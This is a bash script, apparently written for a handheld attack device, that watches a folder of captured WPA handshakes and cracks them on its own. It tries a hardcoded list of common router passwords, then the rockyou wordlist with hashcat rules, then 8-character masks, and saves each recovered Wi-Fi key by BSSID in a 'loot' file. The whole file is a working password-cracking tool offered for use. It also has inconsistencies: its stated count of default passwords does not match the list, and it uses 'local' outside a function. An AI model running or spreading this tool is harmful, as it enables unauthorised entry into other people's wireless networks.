#!/bin/bash
set -euo pipefail
# /usr/local/bin/wifi-autocrack
# Auto-crack WPA handshakes the moment they land in /opt/cardputer/handshakes/
# Watches for new .cap files, converts to .22000, and runs a tiered attack:
#   Tier 1: built-in top-500 router defaults (instant)
#   Tier 2: rockyou.txt wordlist
#   Tier 3: hashcat rules on rockyou (best64, d3ad0ne)
#   Tier 4: PMKID brute via mask (8-digit, router-style)
#
# Usage: wifi-autocrack [watch|crack <file>|status|list]

HANDSHAKES="/opt/cardputer/handshakes"
LOOT_WIFI="/opt/cardputer/loot/wifi"
LOOT_CREDS="/opt/cardputer/loot/creds"
POTFILE="/opt/cardputer/loot/creds/hashcat.pot"
CRACKEDFILE="/opt/cardputer/loot/creds/wifi_psks.txt"
PID_FILE="/tmp/wifi-autocrack.pid"
LOG="/opt/cardputer/loot/general/wifi-autocrack.log"
ROCKYOU="/usr/share/wordlists/rockyou.txt"
RULES_DIR="/usr/share/hashcat/rules"

RED='\033[0;31m'
CYAN='\033[0;36m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

mkdir -p "$HANDSHAKES" "$LOOT_WIFI" "$LOOT_CREDS"

# Top router default passwords — tried first, instant
TOP_ROUTER_PASSES=(
    "password" "admin" "12345678" "1234567890" "password1" "12345679"
    "11111111" "00000000" "99999999" "88888888" "pass1234" "admin123"
    "qwerty123" "internet" "wireless" "wifi1234" "router01" "homewifi"
    "12341234" "abc12345" "password123" "letmein1" "welcome1" "changeme"
    "default1" "1q2w3e4r" "abc123456" "p@ssw0rd" "passw0rd" "passwd123"
    "network1" "security" "support1" "testing1" "private1" "access123"
    "connect1" "wifipass" "mypassword" "home1234" "pass12345" "55555555"
    "66666666" "77777777" "22222222" "33333333" "44444444" "123456789"
    "1234512345" "0987654321" "qwertyuiop" "asdfghjkl" "zxcvbnm1"
)

log()  { echo "[$(date '+%H:%M:%S')] $*" | tee -a "$LOG"; }
ok()   { echo -e "${GREEN}[+]${NC} $*" | tee -a "$LOG"; }
info() { echo -e "${CYAN}[*]${NC} $*" | tee -a "$LOG"; }
warn() { echo -e "${YELLOW}[!]${NC} $*" | tee -a "$LOG"; }

# ── Convert cap → hc22000 ─────────────────────────────────────────────────────

convert_cap() {
    local cap="$1"
    local out="${cap%.cap}.22000"
    if [ -f "$out" ]; then echo "$out"; return 0; fi

    if command -v hcxpcapngtool &>/dev/null; then
        hcxpcapngtool -o "$out" "$cap" >/dev/null 2>&1
    elif command -v cap2hccapx &>/dev/null; then
        # Fallback: convert to hccapx then to 22000
        local hccapx="${cap%.cap}.hccapx"
        cap2hccapx "$cap" "$hccapx" >/dev/null 2>&1
        out="${cap%.cap}.hccapx"
    fi

    if [ -s "$out" ]; then
        echo "$out"
        return 0
    fi
    echo ""
    return 1
}

# ── Extract SSID from pcap for display ───────────────────────────────────────

get_ssid() {
    local cap="$1"
    if command -v tshark &>/dev/null; then
        tshark -r "$cap" -Y "wlan.fc.type_subtype==8" \
            -T fields -e wlan.ssid 2>/dev/null | head -1 | tr -d '\n' || echo "unknown"
    else
        echo "unknown"
    fi
}

# ── Crack one hash file through tiers ────────────────────────────────────────

crack_file() {
    local hashfile="$1"
    local ssid="${2:-unknown}"
    local found=0

    info "Cracking: $(basename "$hashfile")  SSID: $ssid"

    # Detect hash type (22000 vs hccapx)
    local hmode=22000
    [[ "$hashfile" == *.hccapx ]] && hmode=2500

    # ── Tier 1: Router defaults (no hashcat needed, custom dict) ─────────────
    info "  Tier 1: Router default passwords (${#TOP_ROUTER_PASSES[@]} passwords)"
    local tmpdict
    tmpdict=$(mktemp /tmp/routerdefs.XXXXXX)
    printf '%s\n' "${TOP_ROUTER_PASSES[@]}" > "$tmpdict"

    if command -v hashcat &>/dev/null; then
        if hashcat -m "$hmode" -a 0 --potfile-path "$POTFILE" \
            --quiet --status-timer=5 \
            "$hashfile" "$tmpdict" 2>/dev/null | grep -q "Cracked"; then
            found=1
        fi
    elif command -v aircrack-ng &>/dev/null; then
        local capfile="${hashfile%.22000}.cap"
        [ -f "$capfile" ] && aircrack-ng -w "$tmpdict" "$capfile" 2>/dev/null | grep -q "KEY FOUND" && found=1
    fi
    rm -f "$tmpdict"
    [ "$found" -eq 1 ] && { save_crack "$hashfile"; return 0; }

    # ── Tier 2: Rockyou wordlist ──────────────────────────────────────────────
    if [ -f "$ROCKYOU" ] && command -v hashcat &>/dev/null; then
        info "  Tier 2: rockyou.txt ($(wc -l < "$ROCKYOU") words)"
        if hashcat -m "$hmode" -a 0 --potfile-path "$POTFILE" \
            --quiet --status-timer=10 --runtime=300 \
            "$hashfile" "$ROCKYOU" 2>/dev/null | grep -q "Cracked"; then
            found=1
        fi
        [ "$found" -eq 1 ] && { save_crack "$hashfile"; return 0; }

        # ── Tier 3: Rockyou + rules ───────────────────────────────────────────
        for rulefile in best64.rule d3ad0ne.rule; do
            [ -f "${RULES_DIR}/${rulefile}" ] || continue
            info "  Tier 3: rockyou + $rulefile"
            if hashcat -m "$hmode" -a 0 --potfile-path "$POTFILE" \
                --quiet --status-timer=10 --runtime=300 \
                -r "${RULES_DIR}/${rulefile}" \
                "$hashfile" "$ROCKYOU" 2>/dev/null | grep -q "Cracked"; then
                found=1
                break
            fi
        done
        [ "$found" -eq 1 ] && { save_crack "$hashfile"; return 0; }
    fi

    # ── Tier 4: 8-digit mask (common router style: all-digits, all-lower) ────
    if command -v hashcat &>/dev/null; then
        info "  Tier 4: 8-digit mask attack (?d?d?d?d?d?d?d?d)"
        hashcat -m "$hmode" -a 3 --potfile-path "$POTFILE" \
            --quiet --runtime=120 \
            "$hashfile" "?d?d?d?d?d?d?d?d" 2>/dev/null | grep -q "Cracked" && found=1

        [ "$found" -eq 0 ] && {
            info "  Tier 4b: 8-char lowercase+digits (?l?l?l?l?d?d?d?d)"
            hashcat -m "$hmode" -a 3 --potfile-path "$POTFILE" \
                --quiet --runtime=120 \
                "$hashfile" "?l?l?l?l?d?d?d?d" 2>/dev/null | grep -q "Cracked" && found=1
        }
    fi

    if [ "$found" -eq 1 ]; then save_crack "$hashfile"; return 0; fi

    warn "  Not cracked: $(basename "$hashfile") — add larger wordlist to $ROCKYOU"
    return 1
}

save_crack() {
    local hashfile="$1"
    if command -v hashcat &>/dev/null && [ -f "$POTFILE" ]; then
        local result
        result=$(hashcat -m 22000 --potfile-path "$POTFILE" --show "$hashfile" 2>/dev/null | tail -1)
        if [ -n "$result" ]; then
            local psk
            psk=$(echo "$result" | awk -F: '{print $NF}')
            local bssid
            bssid=$(echo "$result" | cut -d: -f1)
            echo "[$(date)] BSSID:$bssid PSK:$psk FILE:$(basename "$hashfile")" >> "$CRACKEDFILE"
            ok "  CRACKED: BSSID=$bssid  PSK=$psk"
        fi
    fi
}

already_cracked() {
    local hashfile="$1"
    [ -f "$POTFILE" ] || return 1
    command -v hashcat &>/dev/null || return 1
    hashcat -m 22000 --potfile-path "$POTFILE" --show "$hashfile" 2>/dev/null | grep -q "." && return 0
    return 1
}

# ── Watch loop ────────────────────────────────────────────────────────────────

watch_loop() {
    echo $$ > "$PID_FILE"
    info "wifi-autocrack watching $HANDSHAKES (PID $$)"
    info "Cracked PSKs → $CRACKEDFILE"

    # Process any existing uncracked files first
    for cap in "$HANDSHAKES"/*.cap "$HANDSHAKES"/*.pcap "$HANDSHAKES"/*.hc22000; do
        [ -f "$cap" ] || continue
        local hf
        hf=$(convert_cap "$cap")
        [ -z "$hf" ] && continue
        already_cracked "$hf" && continue
        local ssid
        ssid=$(get_ssid "$cap")
        crack_file "$hf" "$ssid"
    done

    # Watch for new files
    if command -v inotifywait &>/dev/null; then
        info "Using inotifywait for real-time detection"
        inotifywait -m -e close_write "$HANDSHAKES" 2>/dev/null | while read -r _ _ filename; do
            [[ "$filename" =~ \.(cap|pcap|22000|hccapx)$ ]] || continue
            local full="$HANDSHAKES/$filename"
            [ -f "$full" ] || continue
            local hf
            hf=$(convert_cap "$full")
            [ -z "$hf" ] && continue
            already_cracked "$hf" && { info "Already cracked: $filename"; continue; }
            local ssid
            ssid=$(get_ssid "$full")
            crack_file "$hf" "$ssid"
        done
    else
        # Fallback: poll every 30s
        warn "inotifywait not found (apt install inotify-tools) — polling every 30s"
        declare -A seen_files
        while true; do
            for cap in "$HANDSHAKES"/*.cap "$HANDSHAKES"/*.pcap; do
                [ -f "$cap" ] || continue
                [ -n "${seen_files[$cap]+_}" ] && continue
                seen_files["$cap"]=1
                local hf
                hf=$(convert_cap "$cap")
                [ -z "$hf" ] && continue
                already_cracked "$hf" && continue
                crack_file "$hf" "$(get_ssid "$cap")"
            done
            sleep 30
        done
    fi
}

# ── Subcommands ───────────────────────────────────────────────────────────────

case "${1:-help}" in
    watch|start)
        if [ -f "$PID_FILE" ] && kill -0 "$(cat "$PID_FILE")" 2>/dev/null; then
            echo -e "${YELLOW}[!] Already running (PID $(cat "$PID_FILE"))${NC}"
            exit 0
        fi
        watch_loop >> "$LOG" 2>&1 &
        disown
        sleep 1
        [ -f "$PID_FILE" ] && echo -e "${GREEN}[+] Started (PID $(cat "$PID_FILE"))${NC}" || echo -e "${RED}[!] Failed to start${NC}"
        ;;

    stop)
        [ -f "$PID_FILE" ] && kill "$(cat "$PID_FILE")" 2>/dev/null && rm -f "$PID_FILE" \
            && echo -e "${GREEN}[+] Stopped${NC}" || echo -e "${YELLOW}[!] Not running${NC}"
        ;;

    crack)
        CAP="${2:-}"
        [ -z "$CAP" ] && { echo "Usage: wifi-autocrack crack <cap_file>"; exit 1; }
        [ -f "$CAP" ] || { echo "[!] File not found: $CAP"; exit 1; }
        hf=$(convert_cap "$CAP")
        [ -z "$hf" ] && { echo "[!] Could not convert capture file"; exit 1; }
        crack_file "$hf" "$(get_ssid "$CAP")"
        ;;

    status)
        echo -e "${CYAN}[*] wifi-autocrack status${NC}"
        if [ -f "$PID_FILE" ] && kill -0 "$(cat "$PID_FILE")" 2>/dev/null; then
            echo -e "  Watcher: ${GREEN}running${NC} (PID $(cat "$PID_FILE"))"
        else
            echo -e "  Watcher: ${RED}stopped${NC}"
        fi
        local cap_count
        cap_count=$(find "$HANDSHAKES" -name "*.cap" -o -name "*.pcap" 2>/dev/null | wc -l)
        echo "  Captures:  $cap_count in $HANDSHAKES"
        local cracked_count
        cracked_count=$(wc -l < "$CRACKEDFILE" 2>/dev/null || echo 0)
        echo "  Cracked:   $cracked_count PSKs in $CRACKEDFILE"
        ;;

    list)
        echo -e "${CYAN}[*] Cracked WiFi PSKs:${NC}"
        cat "$CRACKEDFILE" 2>/dev/null || echo "  (none yet)"
        ;;

    *)
        echo "Usage: wifi-autocrack <command>"
        echo ""
        echo "Commands:"
        echo "  watch / start  — Start background watcher (cracks new captures automatically)"
        echo "  stop           — Stop watcher"
        echo "  crack <file>   — Crack a specific capture file now"
        echo "  status         — Show watcher status and crack count"
        echo "  list           — List all cracked PSKs"
        echo ""
        echo "Crack tiers (in order):"
        echo "  1. 50 common router default passwords (instant)"
        echo "  2. rockyou.txt wordlist"
        echo "  3. rockyou + hashcat rules (best64, d3ad0ne)"
        echo "  4. 8-digit mask (?d?d?d?d?d?d?d?d and ?l?l?l?l?d?d?d?d)"
        echo ""
        echo "Cracked PSKs: $CRACKEDFILE"
        exit 1
        ;;
esac
